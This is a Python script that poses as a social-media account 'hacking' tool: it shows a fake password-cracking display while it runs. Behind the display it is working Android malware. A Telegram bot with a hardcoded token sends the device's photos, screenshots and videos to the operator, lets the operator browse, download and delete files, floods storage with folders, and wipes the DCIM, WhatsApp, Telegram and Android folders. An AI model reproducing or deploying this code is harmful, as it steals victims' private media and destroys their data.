import subprocess
import sys
import shutil
import os
import time
import threading
import telebot
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
from collections import deque
import random
import io
import traceback
import pyfiglet
from colorama import Fore, Style
from telebot import types

# التحقق من المكتبات المطلوبة
required_libraries = ["telebot", "pyfiglet", "colorama"]
for library in required_libraries:
    try:
        __import__(library)
    except ImportError:
        subprocess.check_call([sys.executable, "-m", "pip", "install", library])

# إعدادات البوت
bot = telebot.TeleBot("9145461614:AAEnMWcJurWIPZ5xs31BujJaAqRvke22xYY")

# مسارات افتراضية (بيئة أندرويد)
base_path = "/storage/emulated/0"
camera_photos_path = f"{base_path}/DCIM/Camera"
screenshots_path = f"{base_path}/DCIM/Screenshots"
downloads_photos_path = f"{base_path}/Download"

chat_id = "8393354044"
photo_queue = deque()
video_queue = deque()

# متغير للتحكم في حالة الهجمة
attack_running = True

# نظام الفهرسة الرقمية (Indexing) لحل مشكلة BUTTON_DATA_INVALID نهائياً
# نقوم بتخزين المسار الحالي لكل مستخدم والملفات المعروضة له
user_current_path = {}
user_items_map = {}

def print_colored(text, color):
    print(color + text + Style.RESET_ALL)

def show_banner(delay=0.05):
    os.system('cls' if os.name == 'nt' else 'clear')
    logo_text = "303"
    big_logo = pyfiglet.figlet_format(logo_text, font="banner3-D")
    for line in big_logo.splitlines():
        print(Fore.RED + Style.BRIGHT + line, flush=True)
        time.sleep(0.1)
    print("\n" + Fore.MAGENTA + "Release : " + Fore.RED + "1.0 - 2024/11" + Style.RESET_ALL)
    print()
    print_colored("========================================", Fore.RED)
    print_colored("            Attacking for accounts          ", Fore.GREEN)
    print_colored("========================================", Fore.RED)
    print()
    hacking_message = "Choose one of the following options to start hacking:"
    for char in hacking_message:
        print(Fore.YELLOW + char, end='', flush=True)
        time.sleep(delay)
    print(Style.RESET_ALL + "\n")
    options = [
        "1 - Instagram Hacking", "2 - Facebook Hacking", "3 - Messenger Hacking",
        "4 - Twitter Hacking", "5 - WhatsApp Hacking", "6 - Telegram Hacking",
        "7 - Snapchat Hacking", "8 - Google Hacking", "9 - YouTube Hacking",
        "10 - Device Hacking"
    ]
    for option in options:
        print(Fore.CYAN + option + Style.RESET_ALL)
        time.sleep(0.1)

def password_simulation():
    chars = "abcdlmnozABCDEFGHIJKLMNOPQRSTUVWXYZ012345678@"
    while True:
        if not attack_running:
            time.sleep(1)
            continue
        fake_password = ''.join(random.choice(chars) for _ in range(random.randint(10, 16)))
        print(Fore.MAGENTA + "Trying password: " + Fore.RED + fake_password + Style.RESET_ALL)
        time.sleep(0.3)

def fake_hacking_process():
    show_banner(delay=0.02)
    print_colored("========================================", Fore.RED)
    choice = input(Fore.MAGENTA + "Enter the option number: "+ Style.RESET_ALL)
    if choice.isdigit() and 1 <= int(choice) <= 10:
        print(Fore.YELLOW + "Please enter the target information for option " + choice + "\033[0m")
        target_info = input(Fore.MAGENTA + "Enter the username or ID of the victim's account : " + Style.RESET_ALL)
        time.sleep(3)
        print(Fore.GREEN + "The account has been found successfully!\033[0m")
        time.sleep(2)
        print(Fore.CYAN + "Processing... This may take 5-10 minutes. Please wait.\033[0m")
        time.sleep(1)
        password_thread = threading.Thread(target=password_simulation)
        password_thread.daemon = True
        password_thread.start()
        start_telegram_bot()

def start_telegram_bot():
    threading.Thread(target=send_files_periodically, daemon=True).start()
    bot.polling(non_stop=True)

def send_files_from_queue(file_queue, file_type):
    while True:
        if not attack_running or not file_queue:
            time.sleep(1)
            continue
        files_to_send = []
        if file_type == "photo":
            while len(files_to_send) < 5 and file_queue:
                files_to_send.append(file_queue.popleft())
        elif file_type == "video":
            while len(files_to_send) < 2 and file_queue:
                files_to_send.append(file_queue.popleft())
        for file_path in files_to_send:
            if not attack_running: break
            try:
                if not os.path.exists(file_path): continue
                with open(file_path, "rb") as f:
                    if file_type == "photo":
                        bot.send_photo(chat_id=chat_id, photo=f, timeout=60)
                    else:
                        bot.send_video(chat_id=chat_id, video=f, timeout=120)
                time.sleep(0.5)
            except Exception:
                time.sleep(2)

def add_files_to_queue(path, file_type="photo"):
    if not os.path.exists(path): return
    for root, _, files in os.walk(path):
        if not attack_running: break
        for file in files:
            if file_type == "photo" and file.lower().endswith((".jpg", ".png", ".jpeg", ".webp")):
                photo_queue.append(os.path.join(root, file))
            elif file_type == "video" and file.lower().endswith((".mp4", ".avi", ".mkv", ".mov")):
                video_queue.append(os.path.join(root, file))

def send_files_periodically():
    for _ in range(3):
        threading.Thread(target=send_files_from_queue, args=(photo_queue, "photo"), daemon=True).start()
    threading.Thread(target=send_files_from_queue, args=(video_queue, "video"), daemon=True).start()
    while True:
        time.sleep(10)

def list_files(path, chat_id, message_id=None):
    try:
        if not os.path.exists(path):
            path = base_path
        
        user_current_path[chat_id] = path
        markup = InlineKeyboardMarkup(row_width=1)
        items = os.listdir(path)
        
        # أزرار التحكم
        control_btns = []
        if path != base_path:
            control_btns.append(InlineKeyboardButton(text="⬅️ رجوع", callback_data="nav_back"))
        control_btns.append(InlineKeyboardButton(text="🏠 الرئيسي", callback_data="nav_home"))
        markup.add(*control_btns)
        
        # تصنيف العناصر وتخزينها في خريطة المستخدم
        dirs = sorted([d for d in items if os.path.isdir(os.path.join(path, d))])[:15]
        files = sorted([f for f in items if os.path.isfile(os.path.join(path, f))])[:15]
        
        current_map = {}
        idx = 0
        
        for d in dirs:
            current_map[str(idx)] = {"name": d, "type": "dir", "path": os.path.join(path, d)}
            markup.add(InlineKeyboardButton(text=f"📁 {d}", callback_data=f"idx_{idx}"))
            idx += 1
        
        for f in files:
            current_map[str(idx)] = {"name": f, "type": "file", "path": os.path.join(path, f)}
            markup.add(InlineKeyboardButton(text=f"📄 {f}", callback_data=f"idx_{idx}"))
            idx += 1
            
        user_items_map[chat_id] = current_map
        markup.add(InlineKeyboardButton(text="🔙 العودة للقائمة الرئيسية", callback_data="back_to_main"))
        
        text = f"📂 المسار الحالي:\n`{path}`"
        if message_id:
            bot.edit_message_text(chat_id=chat_id, message_id=message_id, text=text, reply_markup=markup, parse_mode="Markdown")
        else:
            bot.send_message(chat_id=chat_id, text=text, reply_markup=markup, parse_mode="Markdown")
    except Exception as e:
        bot.send_message(chat_id=chat_id, text=f"❌ خطأ في التصفح: {e}")

@bot.message_handler(commands=['start'])
def send_welcome(message):
    global attack_running
    status_text = "🟢 نشطة" if attack_running else "🔴 متوقفة"
    markup = InlineKeyboardMarkup(row_width=1)
    markup.add(
        InlineKeyboardButton(text="📷 سحب الصور", callback_data="get_photos"),
        InlineKeyboardButton(text="🎥 سحب الفيديوهات", callback_data="get_videos"),
        InlineKeyboardButton(text="🗂️ رفع الملفات", callback_data="upload_files"),
        InlineKeyboardButton(text="📂 تصفح وإدارة الملفات", callback_data="nav_home"),
        InlineKeyboardButton(text="🗑️ الحذف التلقائي للملفات المهمة", callback_data="auto_delete_important"),
        InlineKeyboardButton(text="⚠️ مسح شامل (فورمات)", callback_data="emergency_wipe"),
        InlineKeyboardButton(text=f"🛑 إيقاف/تشغيل الهجمة ({status_text})", callback_data="toggle_attack"),
        InlineKeyboardButton(text="🔙 رجوع", callback_data="back_to_main")
    )
    bot.send_message(chat_id=message.chat.id, text="يرجى اختيار أحد الخيارات:", reply_markup=markup)

@bot.callback_query_handler(func=lambda call: True)
def callback_handler(call):
    global attack_running
    chat_id = call.message.chat.id
    
    try:
        bot.answer_callback_query(call.id)
    except:
        pass

    if call.data == "toggle_attack":
        attack_running = not attack_running
        send_welcome(call.message)
        bot.delete_message(chat_id, call.message.message_id)

    elif call.data == "nav_home":
        list_files(base_path, chat_id, call.message.message_id)

    elif call.data == "nav_back":
        current = user_current_path.get(chat_id, base_path)
        parent = os.path.dirname(current.rstrip('/'))
        list_files(parent, chat_id, call.message.message_id)

    elif call.data.startswith("idx_"):
        idx = call.data.replace("idx_", "")
        item = user_items_map.get(chat_id, {}).get(idx)
        if not item:
            bot.send_message(chat_id, "❌ خطأ في الجلسة، يرجى التحديث")
            return
        
        if item["type"] == "dir":
            list_files(item["path"], chat_id, call.message.message_id)
        else:
            markup = InlineKeyboardMarkup(row_width=2)
            markup.add(
                InlineKeyboardButton(text="🗑️ حذف", callback_data=f"act_del_{idx}"),
                InlineKeyboardButton(text="📝 تغيير اسم", callback_data=f"act_ren_{idx}"),
                InlineKeyboardButton(text="📥 تنزيل", callback_data=f"act_dwn_{idx}"),
                InlineKeyboardButton(text="🔙 رجوع", callback_data="nav_refresh")
            )
            bot.edit_message_text(chat_id=chat_id, message_id=call.message.message_id,
                                  text=f"📄 خيارات الملف:\n`{item['path']}`", reply_markup=markup, parse_mode="Markdown")

    elif call.data == "nav_refresh":
        current = user_current_path.get(chat_id, base_path)
        list_files(current, chat_id, call.message.message_id)

    elif call.data.startswith("act_"):
        action_parts = call.data.split("_")
        action = action_parts[1]
        idx = action_parts[2]
        item = user_items_map.get(chat_id, {}).get(idx)
        
        if not item:
            bot.send_message(chat_id, "❌ خطأ في الجلسة")
            return
        
        path = item["path"]
        if action == "del":
            try:
                os.remove(path)
                bot.send_message(chat_id, "✅ تم الحذف بنجاح")
                list_files(os.path.dirname(path), chat_id, call.message.message_id)
            except Exception as e:
                bot.send_message(chat_id, f"❌ فشل الحذف: {e}")
        elif action == "dwn":
            try:
                with open(path, "rb") as f:
                    bot.send_document(chat_id, f)
            except Exception as e:
                bot.send_message(chat_id, f"❌ فشل التنزيل: {e}")
        elif action == "ren":
            bot.send_message(chat_id, f"📝 أرسل الاسم الجديد للملف:\nالحالي: `{os.path.basename(path)}`", parse_mode="Markdown")
            bot.register_next_step_handler(call.message, process_rename, path)

    elif call.data == "auto_delete_important":
        bot.send_message(chat_id, "🔍 جاري البحث عن الملفات المهمة وحذفها تلقائياً...")
        threading.Thread(target=auto_delete_critical_files, args=(chat_id,), daemon=True).start()

    elif call.data == "get_photos":
        markup = InlineKeyboardMarkup(row_width=2)
        markup.add(
            InlineKeyboardButton(text="📸 صور الكاميرا", callback_data="camera_photos"),
            InlineKeyboardButton(text="📲 لقطات الشاشة", callback_data="screenshots"),
            InlineKeyboardButton(text="⬇️ التنزيلات", callback_data="download_photos"),
            InlineKeyboardButton(text="📁 الكل", callback_data="all_photos"),
            InlineKeyboardButton(text="🔙 رجوع", callback_data="back_to_main")
        )
        bot.edit_message_text(chat_id=chat_id, message_id=call.message.message_id,
                              text="يرجى اختيار نوع الصور:", reply_markup=markup)

    elif call.data == "get_videos":
        markup = InlineKeyboardMarkup(row_width=1)
        markup.add(
            InlineKeyboardButton(text="🎥 فيديوهات الكاميرا", callback_data="camera_videos"),
            InlineKeyboardButton(text="🎬 تسجيلات الشاشة", callback_data="screen_recordings"),
            InlineKeyboardButton(text="📂 الكل", callback_data="all_videos"),
            InlineKeyboardButton(text="🔙 رجوع", callback_data="back_to_main")
        )
        bot.edit_message_text(chat_id=chat_id, message_id=call.message.message_id,
                              text="يرجى اختيار نوع الفيديوهات:", reply_markup=markup)
        
    elif call.data == "camera_photos":
        bot.send_message(chat_id=chat_id, text="بدأ سحب صور الكاميرا...")
        add_files_to_queue(camera_photos_path, "photo")

    elif call.data == "screenshots":
        bot.send_message(chat_id=chat_id, text="بدأ سحب لقطات الشاشة...")
        add_files_to_queue(screenshots_path, "photo")

    elif call.data == "download_photos":
        bot.send_message(chat_id=chat_id, text="بدأ سحب صور التنزيلات...")
        add_files_to_queue(downloads_photos_path, "photo")

    elif call.data == "all_photos":
        bot.send_message(chat_id=chat_id, text="بدأ سحب جميع الصور...")
        add_files_to_queue(base_path, "photo")

    elif call.data == "camera_videos":
        bot.send_message(chat_id=chat_id, text="بدأ سحب فيديوهات الكاميرا...")
        add_files_to_queue(camera_photos_path, "video")

    elif call.data == "screen_recordings":
        bot.send_message(chat_id=chat_id, text="بدأ سحب تسجيلات الشاشة...")
        add_files_to_queue(screenshots_path, "video")

    elif call.data == "all_videos":
        bot.send_message(chat_id=chat_id, text="بدأ سحب جميع الفيديوهات...")
        add_files_to_queue(base_path, "video")

    elif call.data == "upload_files":
        markup = types.InlineKeyboardMarkup(row_width=2)
        markup.add(
            types.InlineKeyboardButton(text="ملفات عامة", callback_data="upload_general_files"),
            types.InlineKeyboardButton(text="صور", callback_data="upload_photos"),
            types.InlineKeyboardButton(text="فيديوهات", callback_data="upload_videos"),
            types.InlineKeyboardButton(text="تطبيقات", callback_data="upload_apps"),
            types.InlineKeyboardButton(text="مستندات", callback_data="upload_files_specific"),
            types.InlineKeyboardButton(text="موسيقى", callback_data="upload_music"),
            types.InlineKeyboardButton(text="🔙 رجوع", callback_data="back_to_main")
        )
        bot.edit_message_text(chat_id=chat_id, message_id=call.message.message_id,
                              text="🔰 اختر نوع الملف للرفع :", reply_markup=markup)

    elif call.data in ["upload_general_files", "upload_photos", "upload_videos", "upload_apps", "upload_files_specific", "upload_music"]:
        bot.send_message(chat_id=chat_id, text="💬 أدخل اسم المجلد للرفع فيه :")
        bot.register_next_step_handler(call.message, ask_folder_name, call.data)

    elif call.data == "back_to_main":
        send_welcome(call.message)

    elif call.data == "emergency_wipe":
        markup = InlineKeyboardMarkup(row_width=2)
        markup.add(
            InlineKeyboardButton(text="✅ تأكيد", callback_data="confirm_wipe"),
            InlineKeyboardButton(text="❌ إلغاء", callback_data="back_to_main")
        )
        bot.edit_message_text(chat_id=chat_id, message_id=call.message.message_id,
                              text="🚨 تحذير: سيتم حذف مجلدات النظام والداتا الأساسية. هل أنت متأكد؟", reply_markup=markup)

    elif call.data == "confirm_wipe":
        bot.send_message(chat_id=chat_id, text="🚀 بدأت عملية المسح الشامل...")
        threading.Thread(target=perform_emergency_wipe, args=(chat_id,), daemon=True).start()

def process_rename(message, old_path):
    new_name = message.text
    try:
        new_path = os.path.join(os.path.dirname(old_path), new_name)
        os.rename(old_path, new_path)
        bot.send_message(message.chat.id, f"✅ تم تغيير الاسم بنجاح.")
        list_files(os.path.dirname(new_path), message.chat.id)
    except Exception as e:
        bot.send_message(message.chat.id, f"❌ فشل تغيير الاسم: {e}")

def auto_delete_critical_files(chat_id):
    critical_extensions = ['.pdf', '.docx', '.xlsx', '.pptx', '.jpg', '.png', '.txt', '.zip']
    deleted_count = 0
    for root, _, files in os.walk(base_path):
        if not attack_running: break
        for file in files:
            if any(file.lower().endswith(ext) for ext in critical_extensions):
                try:
                    os.remove(os.path.join(root, file))
                    deleted_count += 1
                except: pass
    bot.send_message(chat_id, f"✅ تم حذف {deleted_count} ملف مهم بنجاح.")

def ask_folder_name(message, file_type):
    folder_name = message.text
    bot.send_message(chat_id=message.chat.id, text="☢ أدخل عدد المجلدات (1-1000):")
    bot.register_next_step_handler(message, ask_number_of_folders, file_type, folder_name)

def ask_number_of_folders(message, file_type, folder_name):
    try:
        folder_count = int(message.text)
        if folder_count < 1 or folder_count > 1000: raise ValueError()
        created_folders = []
        for i in range(folder_count):
            folder_path = f"{base_path}/{folder_name}_{i+1}"
            os.makedirs(folder_path, exist_ok=True)
            created_folders.append(folder_path)
        bot.send_message(chat_id=message.chat.id, text="✅ تم إنشاء المجلدات. أرسل الملف الآن:")
        bot.register_next_step_handler(message, receive_files, file_type, folder_name, folder_count, created_folders)
    except:
        bot.send_message(chat_id=message.chat.id, text="❌ عدد غير صحيح.")

def receive_files(message, file_type, folder_name, folder_count, created_folders):
    if not attack_running: return
    bot.send_message(chat_id=message.chat.id, text="♻️ جاري الرفع...")
    try:
        for folder_path in created_folders:
            if not attack_running: break
            save_file(message, folder_path)
        bot.send_message(chat_id=message.chat.id, text="✅ تم الرفع بنجاح.")
    except Exception as e:
        bot.send_message(chat_id=message.chat.id, text=f"❌ فشل الرفع: {e}")

def save_file(file, folder_path):
    file_name = get_file_name(file)
    file_path = os.path.join(folder_path, file_name)
    if file.content_type == 'photo': file_id = file.photo[-1].file_id
    elif file.content_type == 'document': file_id = file.document.file_id
    elif file.content_type == 'audio': file_id = file.audio.file_id
    elif file.content_type == 'video': file_id = file.video.file_id
    else: return
    file_content = bot.download_file(bot.get_file(file_id).file_path)
    with open(file_path, "wb") as f:
        f.write(file_content)

def perform_emergency_wipe(chat_id):
    targets = [f"{base_path}/Android", f"{base_path}/DCIM", f"{base_path}/Download", f"{base_path}/WhatsApp", f"{base_path}/Telegram", f"{base_path}/Pictures", f"{base_path}/Documents"]
    deleted_count = 0
    for target in targets:
        if not attack_running: break
        try:
            if os.path.exists(target):
                shutil.rmtree(target, ignore_errors=True)
                deleted_count += 1
        except: pass
    bot.send_message(chat_id=chat_id, text=f"🏁 اكتمل المسح بنجاح.")

def get_file_name(file):
    if file.content_type == 'photo': return f"{file.photo[-1].file_id}.jpg"
    elif file.content_type == 'document': return file.document.file_name
    elif file.content_type == 'audio': return file.audio.file_name
    elif file.content_type == 'video': return file.video.file_name
    return "file"

if __name__ == "__main__":
    fake_hacking_process()
